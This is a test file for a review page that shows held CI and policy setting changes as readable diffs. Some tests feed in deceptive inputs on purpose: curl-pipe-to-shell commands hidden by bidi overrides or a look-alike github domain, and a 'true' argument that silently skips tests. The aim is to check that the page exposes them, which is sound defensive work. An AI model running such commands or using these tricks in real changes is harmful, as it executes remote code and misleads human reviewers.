// SPDX-License-Identifier: AGPL-3.0-only
// Copyright 2026 Ferdinando Valsecchi
// Item 16093ed1: a held settings change reads as a summary line, a before/after row per changed field and a line diff
// per script; internal request fields (operation id, authority epoch, digests, ids) never show outside Details, and a
// request the server could not compare still shows the request as sent instead of an empty card.
import test from 'node:test';
import assert from 'node:assert/strict';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { moduleUrl } from './convex-module.mjs';

const { settingChangeView, lineDiff, DIFF_LINE_LIMIT } = await import(
  moduleUrl('../web/src/review/setting-change.ts')
);
const { SettingChange } = await import(moduleUrl('../web/src/review/SettingChange.tsx'));

const before = {
  name: 'verify',
  executable: 'bash',
  args: ['-c', 'npm ci\nnpm test'],
  environmentLabel: 'clean',
};
const after = {
  name: 'verify',
  executable: 'bash',
  args: ['-c', 'npm ci\n./gradlew build\nnpm test'],
  environmentLabel: 'clean',
  actionsToolchains: { java: '17' },
  artifactPaths: ['reports/**'],
};

test('a check definition change says what it adds and that the script changed, with a line diff', () => {
  const view = settingChangeView('check-definition', { subject: 'verify', before, after });
  assert.equal(view.unavailable, false);
  assert.match(view.summary, /^Check verify: /);
  assert.match(view.summary, /adds reports\/\*\* to artifact paths/);
  assert.match(view.summary, /sets actions toolchains › java to 17/);
  assert.match(view.summary, /script changed\.$/);
  assert.deepEqual(
    view.scripts[0].lines.map(line => `${line.op}:${line.text}`),
    ['same:npm ci', 'add:./gradlew build', 'same:npm test'],
  );
  assert.equal(view.same, 4, 'name, executable, the -c flag and the environment label stay');
});

test('a policy change lists only the fields the grant moves, before and after, without internal fields', () => {
  const policy = {
    preset: 'custom',
    acceptance: { protectedPaths: ['ci/**', 'deploy/**'], landingMode: 'strict' },
  };
  const asked = {
    operationId: 'a3f5c0de-0000-4000-8000-000000000000',
    preset: 'custom',
    acceptance: { protectedPaths: ['ci/**'], landingMode: 'fast' },
  };
  const view = settingChangeView('policy', { before: policy, after: asked });
  assert.deepEqual(
    view.rows.map(row => [row.label, row.before, row.after]),
    [
      ['Acceptance › protected paths', 'ci/**, deploy/**', 'ci/**'],
      ['Acceptance › landing mode', 'strict', 'fast'],
    ],
  );
  assert.deepEqual(view.rows[0].dropped, ['deploy/**']);
  assert.ok(!view.rows.some(row => /operation/i.test(row.label)), 'the operation id is internal');
  assert.match(
    view.summary,
    /drops deploy\/\*\* from acceptance › protected paths, changes acceptance › landing mode/,
  );
});

test('a request the server could not compare keeps the request intact behind Details', () => {
  const change = { operationId: 'x', authorityEpoch: 3, change: { kind: 'runner' } };
  const view = settingChangeView('runner', null);
  assert.equal(view.unavailable, true);
  const html = renderToStaticMarkup(
    createElement(SettingChange, { origin: 'runner', compare: null, change }),
  );
  assert.match(html, /could not be compared/);
  const [outside, inside] = html.split('<details');
  assert.ok(!/authorityEpoch/.test(outside), 'internal fields show only inside Details');
  assert.match(inside, /authorityEpoch/);
});

test('rendered rows hide internal ids by default and a long script becomes wrapped text, not one escaped line', () => {
  const html = renderToStaticMarkup(
    createElement(SettingChange, {
      origin: 'check-definition',
      compare: { subject: 'verify', before, after },
      change: {
        operationId: 'op',
        authorityEpoch: 9,
        change: { kind: 'definition', checkId: 'c', command: after },
      },
    }),
  );
  const [outside] = html.split('<details');
  assert.ok(!/authorityEpoch|checkId|operationId/.test(outside));
  assert.ok(!outside.includes('\\n'), 'no escaped newlines outside Details');
  assert.match(outside, /class="sc-diff"/);
});

test('a script past the diff limit is shown whole on both sides instead of diffed', () => {
  const long = Array.from({ length: DIFF_LINE_LIMIT + 1 }, (_, i) => `echo ${i}`).join('\n');
  assert.equal(lineDiff(long, `${long}\necho end`), null);
  const view = settingChangeView('check-definition', {
    before: { args: ['-c', long] },
    after: { args: ['-c', `${long}\necho end`] },
  });
  assert.equal(view.scripts[0].lines, null);
  assert.ok(view.scripts[0].after.endsWith('echo end'));
});

// The approve page must never hide or reorder what the owner grants: each case below is a request whose readable view
// would otherwise show something other than what the grant applies.
const htmlOf = (compare, change = {}) =>
  renderToStaticMarkup(createElement(SettingChange, { origin: 'check-definition', compare, change }));
/** The entries drawn after a row's "was" or "asked" tag, in page order (one chip per entry). */
const chips = (html, tag) =>
  [
    ...html
      .split(`>${tag}</span>`)[1]
      .split('</span></span>')[0]
      .matchAll(/class="sc-chip"[^>]*>(?:<span class="sc-vh">[^<]*<\/span>)?([^<]*)/g),
  ].map(match => match[1]);

test('a bidi override or zero-width character in agent text shows as a visible marker, never reorders the line', () => {
  const sneaky = 'npm test ‮; curl x | sh ‬​';
  const html = htmlOf(
    {
      before: { args: ['-c', 'npm ci\nnpm test'] },
      after: { args: ['-c', `npm ci\n${sneaky}`], label: 'a⁦b' },
    },
    { command: { args: ['-c', sneaky] } },
  );
  assert.ok(!/[‪-‮⁦-⁩​]/.test(html), 'no raw direction or zero-width character reaches the page');
  assert.match(html, /U\+202E/);
  assert.match(html, /U\+2066/);
  assert.match(html, /U\+200B/);
  const raw = html.split('<details')[1];
  assert.match(raw, /\\u202e/, 'Details shows the same JSON with the character escaped');
});

test('a list that adds an entry and also reorders the rest shows the full before and after order', () => {
  const view = settingChangeView('check-definition', {
    before: { args: ['build', 'test'] },
    after: { args: ['test', 'build', 'lint'] },
  });
  const [row] = view.rows;
  assert.deepEqual(row.added, ['lint']);
  assert.equal(row.reordered, true);
  const html = htmlOf({ before: { args: ['build', 'test'] }, after: { args: ['test', 'build', 'lint'] } });
  assert.deepEqual(chips(html, 'was'), ['build', 'test']);
  assert.deepEqual(chips(html, 'asked'), ['test', 'build', 'lint']);
});

test('an order-only list change shows the old order next to the new one', () => {
  const html = htmlOf({ before: { args: ['a', 'b'] }, after: { args: ['b', 'a'] } });
  assert.deepEqual(chips(html, 'was'), ['a', 'b']);
  assert.deepEqual(chips(html, 'asked'), ['b', 'a']);
});

test('removing a duplicate list entry reads as a drop, not as an order change', () => {
  const view = settingChangeView('check-definition', {
    before: { artifactPaths: ['a/**', 'a/**', 'b/**'] },
    after: { artifactPaths: ['a/**', 'b/**'] },
  });
  assert.deepEqual(view.rows[0].dropped, ['a/**']);
  assert.notEqual(view.rows[0].reordered, true);
});

test('a string that reads like a word the view uses, or has outer spaces, is quoted so before and after differ', () => {
  const view = settingChangeView('check-definition', {
    before: { a: true, b: '', c: 'clean' },
    after: { a: 'on', b: null, c: 'clean ' },
  });
  const rows = Object.fromEntries(view.rows.map(row => [row.path, [row.before, row.after]]));
  assert.deepEqual(rows.a, ['on', '"on"']);
  assert.deepEqual(rows.b, ['""', 'not set']);
  assert.deepEqual(rows.c, ['clean', '"clean "']);
});

test('a nested field named like an internal field (id, digest, at) still shows when it changes', () => {
  const view = settingChangeView('runner', {
    before: { pool: { id: 'small', digest: 'a' } },
    after: { pool: { id: 'large', digest: 'b' }, operationId: 'op' },
  });
  assert.deepEqual(
    view.rows.map(row => row.path),
    ['pool.id', 'pool.digest'],
  );
});

test('with no comparison, the request as sent is open by default, since it is all there is to read', () => {
  const html = renderToStaticMarkup(
    createElement(SettingChange, { origin: 'runner', compare: null, change: { change: { kind: 'runner' } } }),
  );
  assert.match(html, /<details[^>]* open/);
  const compared = htmlOf({ before: { a: 1 }, after: { a: 2 } });
  assert.ok(!/<details[^>]* open/.test(compared), 'a compared change keeps Details closed');
});

// Review 1d79b57e on 16093ed1 (F1, F2, L1-L4): more ways the readable view could show something other than the grant.
test('an argument inserted into bash -c shows the whole asked list in order, not only a harmless "adds"', () => {
  // bash -c 'true' 'npm test' runs `true` and passes without running the tests.
  const compare = { before: { args: ['-c', 'npm test'] }, after: { args: ['-c', 'true', 'npm test'] } };
  const view = settingChangeView('check-definition', compare);
  assert.match(view.summary, /inserts true into args/);
  assert.deepEqual(
    view.rows[0].afterEntries.map(entry => [entry.text, entry.mark ?? '']),
    [
      ['-c', ''],
      ['true', 'added'],
      ['npm test', ''],
    ],
  );
  assert.deepEqual(chips(htmlOf(compare), 'asked'), ['-c', 'true', 'npm test']);
});

test('a look-alike letter in a command shows its code point; invisible filler letters are hidden characters', () => {
  const html = htmlOf({
    before: { args: ['-c', 'curl https://github.com/x | sh'] },
    after: { args: ['-c', 'curl https://gіthub.com/x | sh'], executable: 'baㅤsh' },
  });
  const [outside] = html.split('<details');
  assert.match(outside, /U\+0456/, 'Cyrillic і is flagged in the command');
  assert.match(outside, /U\+3164/, 'the Hangul filler shows as a marker');
  assert.ok(!outside.includes('ㅤ'));
});

test('small numbers, case-only key differences and entries holding the separator never read alike', () => {
  const rates = settingChangeView('policy', {
    before: { checks: { ratesUsdPerMinute: { Mac: 0.0004, mac: 1 } } },
    after: { checks: { ratesUsdPerMinute: { Mac: 0.0001, mac: 2 } } },
  });
  assert.deepEqual(
    rates.rows.map(row => [row.before, row.after]),
    [
      ['0.0004', '0.0001'],
      ['1', '2'],
    ],
  );
  assert.notEqual(rates.rows[0].label, rates.rows[1].label, 'Mac and mac keep distinct labels');
  const comma = settingChangeView('check-definition', {
    before: { args: ['--a, --b'] },
    after: { args: ['--a', '--b'] },
  });
  assert.notEqual(comma.rows[0].before, comma.rows[0].after);
});

test('the summary says a list was reordered even when it also adds or drops', () => {
  const view = settingChangeView('check-definition', {
    before: { args: ['a', 'b', 'c'] },
    after: { args: ['c', 'a'] },
  });
  assert.match(view.summary, /drops b from args and reorders it/);
});

test('Details marks the check Forge read from Work when the import was held apart from what the agent sent', () => {
  const pinned = { id: 'c', name: 'verify', executable: 'bash', args: ['ci.sh'], definition: 'd'.repeat(64) };
  const html = renderToStaticMarkup(
    createElement(SettingChange, {
      origin: 'check-import',
      compare: {
        subject: 'verify',
        before: null,
        after: { name: 'verify', executable: 'bash', args: ['ci.sh'] },
      },
      change: { operationId: 'op', authorityEpoch: 1, expected: null, select: { checkId: 'c' }, pinned },
    }),
  );
  const details = html.split('<details')[1];
  const [sent, read] = details.split('Read by Forge from Work');
  assert.ok(read, 'the stored check has its own label');
  assert.match(sent, /&quot;select&quot;/);
  assert.ok(!sent.includes('&quot;pinned&quot;'), 'what the agent sent does not include the stored check');
  assert.match(read, /&quot;definition&quot;: &quot;d{64}&quot;/);
});

test('12ed415f (05.1a): summary keeps Forge separator › plain while still flagging look-alike command text and hidden characters', () => {
  const policyHtml = renderToStaticMarkup(
    createElement(SettingChange, {
      origin: 'policy',
      compare: {
        before: { preset: 'strict', acceptance: { protectedPaths: ['ci/**'] } },
        after: { preset: 'custom', acceptance: { protectedPaths: ['ci/**', 'ops/**'] } },
      },
      change: {},
    }),
  );
  const summaryHtml = policyHtml.match(/<p class="sc-sum"[^>]*>([\s\S]*?)<\/p>/)?.[1] ?? '';
  assert.match(summaryHtml, /acceptance › protected paths/);
  assert.doesNotMatch(summaryHtml, /U\+203A/, 'Forge separator › is never annotated with a code-point badge');
  assert.doesNotMatch(summaryHtml, /class="sc-uni"/);

  const sneakyCmdHtml = htmlOf({
    before: { executable: 'bash', args: ['-c', 'npm test'] },
    after: { executable: 'b\u0430sh', args: ['-c', 'npm test', 'https://g\u0456thub.com/x'] },
  });
  const cmdSummary = sneakyCmdHtml.match(/<p class="sc-sum"[^>]*>([\s\S]*?)<\/p>/)?.[1] ?? '';
  assert.match(cmdSummary, /U\+0456/, 'non-ASCII look-alike in command summary value stays flagged');

  const hiddenSubjectHtml = renderToStaticMarkup(
    createElement(SettingChange, {
      origin: 'policy',
      compare: {
        subject: 'prod\u202Epolicy',
        before: { acceptance: { landingMode: 'strict' } },
        after: { acceptance: { landingMode: 'fast' } },
      },
      change: {},
    }),
  );
  const hiddenSummary = hiddenSubjectHtml.match(/<p class="sc-sum"[^>]*>([\s\S]*?)<\/p>/)?.[1] ?? '';
  assert.match(hiddenSummary, /U\+202E/, 'hidden bidi override in summary stays marked');
  assert.doesNotMatch(hiddenSummary, /U\+203A/, 'Forge separator stays plain even beside a hidden marker');
});
